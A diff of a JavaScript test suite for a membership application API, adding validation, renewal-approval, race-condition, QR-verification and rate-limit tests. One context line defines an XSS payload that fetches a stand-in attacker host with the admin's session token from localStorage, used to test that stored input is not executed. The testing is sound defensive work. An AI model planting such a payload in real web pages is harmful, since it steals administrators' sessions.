@@ -112,16 +112,33 @@ section('BUG-01  Submitted applications are visible to the admin');
 
 const XSS = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bcci_admin_session)">';
 
+const validApp = (overrides = {}) => ({
+  repName: 'Rajesh Shah',
+  repDesignation: 'Director',
+  company: 'Shah Chemicals Ltd',
+  legalStatus: 'Private Limited',
+  enterpriseType: 'Medium',
+  businessServices: 'Chemicals',
+  annualTurnover: '50000000',
+  employees: '50',
+  phone: '9876543210',
+  address: 'Plot 42, GIDC Industrial Estate',
+  district: 'Bharuch',
+  pincode: '392001',
+  paymentRef: 'UPI/123456789012',
+  ...overrides,
+});
+
 r = await call(applications, {
   method: 'POST',
-  body: { repName: 'Rajesh Shah', company: XSS, phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' },
+  body: validApp({ company: XSS, gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' }),
 });
 check('POST without a verified session → 401', r.statusCode === 401, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST',
   token: applicantToken,
-  body: { repName: 'Rajesh Shah', company: XSS, phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' },
+  body: validApp({ company: XSS, gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' }),
 });
 check('POST with a verified session → 201', r.statusCode === 201, JSON.stringify(r.body).slice(0, 200));
 const appId = r.body?.applicationId;
@@ -135,52 +152,88 @@ check('the admin\'s Pending filter now matches it', pending.length === 1, `found
 // Duplicate guard
 r = await call(applications, {
   method: 'POST', token: applicantToken,
-  body: { repName: 'Rajesh Shah', company: 'Dupe Ltd', phone: '9876543210', businessServices: 'Chemicals', district: 'Bharuch' },
+  body: validApp({ company: 'Dupe Ltd' }),
 });
 check('a second application from the same email → 409', r.statusCode === 409, `got ${r.statusCode}`);
 
-// Server-side validation checks
+// Server-side validation checks (SEC-06)
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.11',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', employees: 'abc' },
+  body: validApp({ employees: 'abc' }),
 });
 check('POST with invalid employees → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.12',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', employees: '150abc' },
+  body: validApp({ employees: '150abc' }),
 });
 check('POST with alphanumeric employees (150abc) → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.13',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', address: 'Plot' },
+  body: validApp({ address: 'Plot' }),
 });
 check('POST with short address (<5 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.14',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '1' },
+  body: validApp({ annualTurnover: '1' }),
 });
 check('POST with short annualTurnover (<2 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.21',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '25 Crore' },
+  body: validApp({ annualTurnover: '25 Crore' }),
 });
 check('POST with non-numeric annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.22',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '0' },
+  body: validApp({ annualTurnover: '0' }),
 });
 check('POST with zero annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 r = await call(applications, {
   method: 'POST', token: applicantToken, ip: '203.0.113.23',
-  body: { repName: 'Rajesh Shah', company: 'Test Ltd', phone: '9876543210', businessServices: 'Chemicals', annualTurnover: '-25000000' },
+  body: validApp({ annualTurnover: '-25000000' }),
 });
 check('POST with negative annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.24',
+  body: validApp({ repDesignation: '' }),
+});
+check('POST with missing repDesignation → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.25',
+  body: validApp({ legalStatus: '' }),
+});
+check('POST with missing legalStatus → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.26',
+  body: validApp({ enterpriseType: '' }),
+});
+check('POST with missing enterpriseType → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.27',
+  body: validApp({ pincode: '123' }),
+});
+check('POST with invalid pincode → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.28',
+  body: validApp({ paymentRef: '', paymentProof: '' }),
+});
+check('POST with no payment proof or reference → 400', r.statusCode === 400, `got ${r.statusCode}`);
+
+r = await call(applications, {
+  method: 'POST', token: applicantToken, ip: '203.0.113.29',
+  body: validApp({ paymentProof: 'data:text/plain;base64,bm90LXJlYWw=' }),
+});
+check('POST with invalid payment proof file signature → 400', r.statusCode === 400, `got ${r.statusCode}`);
 
 // ════════════════════════════════════════════════════════════════════
 section('Ownership: an applicant can only read their own record');
@@ -205,9 +258,108 @@ check('admin approves → 200, status Approved', r.statusCode === 200 && r.body?
 check('approvedAt is recorded', !!r.body?.application?.approvedAt);
 
 r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
-check('member renews their own membership → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
-check('renewal extends the term to 2 years', r.body?.application?.renewalYears === 2, `got ${r.body?.application?.renewalYears}`);
+check('member requests renewal → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
+check('SEC-03: member renewal enters Pending Verification', r.body?.application?.renewalStatus === 'Pending Verification');
+check('SEC-03: renewal does not extend term prior to secretariat approval', r.body?.application?.renewalYears === 1);
 check('renewal cannot change status', r.body?.application?.status === 'Approved');
+
+const rDup = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
+check('duplicate renewal is idempotent → 200', rDup.statusCode === 200);
+check('renewalYears remains 1 on duplicate', rDup.body?.application?.renewalYears === 1);
+
+const rBadRef = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: '123' } });
+check('invalid short paymentRef is rejected with 400', rBadRef.statusCode === 400);
+
+// Secretariat approval
+const rUnauthApprove = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'approve-renewal' } });
+check('SEC-03: non-admin cannot approve renewal → 401', rUnauthApprove.statusCode === 401);
+
+const rApprove = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal' } });
+check('SEC-03: admin approves renewal → 200', rApprove.statusCode === 200);
+check('renewal extends the term to 2 years upon secretariat approval', rApprove.body?.application?.renewalYears === 2);
+check('renewalStatus becomes Approved', rApprove.body?.application?.renewalStatus === 'Approved');
+
+// SEC-03: Replay with paymentRef is idempotent, returns 200 and alreadyApproved flag
+const rReplayWithRef = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/12345' } });
+check('SEC-03: replay approval with same paymentRef is idempotent → 200', rReplayWithRef.statusCode === 200);
+check('SEC-03: replay flags alreadyApproved: true', rReplayWithRef.body?.alreadyApproved === true);
+check('SEC-03: repeated approval does NOT add additional years', rReplayWithRef.body?.application?.renewalYears === 2);
+
+// Replay of approve-renewal when renewal is already Approved without pending renewal or matching ref returns 409
+const rReplayApprove = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal' } });
+check('SEC-03: approve-renewal without pending renewal or matching ref returns 409 Conflict', rReplayApprove.statusCode === 409);
+check('SEC-03: error explains no pending renewal', rReplayApprove.body?.error?.includes('no pending renewal'));
+
+// Rejection & resurrection prevention
+const rRejectNoPending = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'reject-renewal' } });
+check('SEC-03: reject-renewal with no pending request returns 409 Conflict', rRejectNoPending.statusCode === 409);
+
+// Member submits a new renewal request
+await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/TO_BE_REJECTED' } });
+
+// Admin rejects the renewal request
+const rReject = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'reject-renewal', reason: 'Invalid payment screenshot' } });
+check('SEC-03: admin rejects renewal → 200', rReject.statusCode === 200);
+check('SEC-03: renewalStatus becomes Rejected', rReject.body?.application?.renewalStatus === 'Rejected');
+
+// Attempt to approve the rejected renewal
+const rResurrect = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/TO_BE_REJECTED' } });
+check('SEC-03: approve-renewal on rejected renewal returns 409 Conflict', rResurrect.statusCode === 409);
+
+// Member submits another renewal for concurrent approval testing
+await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/CONCURRENT1' } });
+
+// Concurrent approval: two admin approval requests race simultaneously
+const [rConc1, rConc2] = await Promise.all([
+  call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/CONCURRENT1' } }),
+  call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/CONCURRENT1' } }),
+]);
+check('SEC-03: first concurrent approval succeeds', rConc1.statusCode === 200 || rConc2.statusCode === 200);
+check('SEC-03: second concurrent approval is handled cleanly (200 idempotent or 409)', [200, 409].includes(rConc1.statusCode) && [200, 409].includes(rConc2.statusCode));
+
+const finalApp = await call(applications, { method: 'GET', token: adminToken, query: { email: 'applicant@example.com' } });
+check('SEC-03: concurrent approval incremented renewalYears by exactly +1 (years = 3)', finalApp.body?.application?.renewalYears === 3, `got ${finalApp.body?.application?.renewalYears}`);
+
+// Direct admin renewal
+const rAdminRenew = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/ADMIN678' } });
+check('SEC-03: admin direct renew extends term to 4 years', rAdminRenew.statusCode === 200 && rAdminRenew.body?.application?.renewalYears === 4);
+
+// ════════════════════════════════════════════════════════════════════
+section('FUNC-01  Public QR verification endpoint');
+
+r = await call(applications, { method: 'GET', query: { verifyId: 'non-existent-id' } });
+check('verify unknown ID → 404', r.statusCode === 404, `got ${r.statusCode}`);
+check('verify unknown ID returns error message', r.body?.success === false && !!r.body?.error);
+
+r = await call(applications, { method: 'GET', query: { verifyId: appId } });
+check('verify valid approved ID → 200', r.statusCode === 200, `got ${r.statusCode}`);
+check('verify returns verified: true for active member', r.body?.verified === true);
+check('verify returns member object with id', r.body?.member?.id === appId);
+check('verify returns company and repName', !!r.body?.member?.company && !!r.body?.member?.repName);
+check('verify returns validUntil timestamp', !!r.body?.member?.validUntil);
+check('verify returns isActive: true', r.body?.member?.isActive === true);
+check('verify does NOT leak PAN', r.body?.member?.panNo === undefined && r.body?.member?.pan === undefined);
+check('verify does NOT leak GSTIN', r.body?.member?.gstNo === undefined && r.body?.member?.gstin === undefined);
+check('verify does NOT leak applicant email', r.body?.member?.email === undefined);
+check('verify does NOT leak applicant phone', r.body?.member?.phone === undefined);
+check('verify does NOT leak applicant address', r.body?.member?.address === undefined);
+check('verify does NOT leak payment proof or ref', r.body?.member?.paymentProof === undefined && r.body?.member?.paymentRef === undefined);
+
+// Also test ?verify= alias
+const rAlias = await call(applications, { method: 'GET', query: { verify: appId } });
+check('verify via ?verify= query alias → 200', rAlias.statusCode === 200);
+
+// Rate limiting on verify endpoint (max 45 per 60s window per IP)
+const spamIp = '203.0.113.88';
+let rateLimited = false;
+for (let i = 0; i < 50; i++) {
+  const rSpam = await call(applications, { method: 'GET', query: { verifyId: appId }, ip: spamIp });
+  if (rSpam.statusCode === 429) {
+    rateLimited = true;
+    break;
+  }
+}
+check('verify endpoint enforces rate limiting (429 on spam)', rateLimited);
 
 // ════════════════════════════════════════════════════════════════════
 section('BUG-05  admin-stats is reachable again');
